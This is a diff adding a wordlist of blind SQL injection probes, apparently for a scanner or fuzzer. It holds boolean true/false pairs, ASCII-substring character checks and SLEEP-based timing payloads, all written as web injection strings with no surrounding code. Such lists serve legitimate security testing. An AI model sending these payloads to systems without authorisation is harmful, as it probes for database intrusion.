@@ -1,0 +1,35 @@
+# Blind SQL Injection Patterns
+' AND 1=1--
+' AND 1=2--
+1' AND 1=1--
+1' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+1' OR 1=1--
+1' OR 1=2--
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+1' AND '1'='1
+1' AND '1'='2
+1' OR '1'='1
+1' OR '1'='2
+' AND 1=1 AND '%'='
+' AND 1=2 AND '%'='
+' AND 1=1 AND '1'='1
+' AND 1=2 AND '1'='1
+1' AND 1=1 AND '1'='1
+1' AND 1=2 AND '1'='1
+' AND ASCII(SUBSTRING((SELECT 1),1,1))=49--
+' AND ASCII(SUBSTRING((SELECT 1),1,1))=50--
+1' AND ASCII(SUBSTRING((SELECT 1),1,1))=49--
+1' AND ASCII(SUBSTRING((SELECT 1),1,1))=50--
+' OR ASCII(SUBSTRING((SELECT 1),1,1))=49--
+' OR ASCII(SUBSTRING((SELECT 1),1,1))=50--
+' AND IF(1=1, SLEEP(2), 0)--
+' AND IF(1=2, SLEEP(2), 0)--
+1' AND IF(1=1, SLEEP(2), 0)--
+1' AND IF(1=2, SLEEP(2), 0)--
+' AND (SELECT CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END)--
+' AND (SELECT CASE WHEN 1=2 THEN SLEEP(2) ELSE 0 END)--
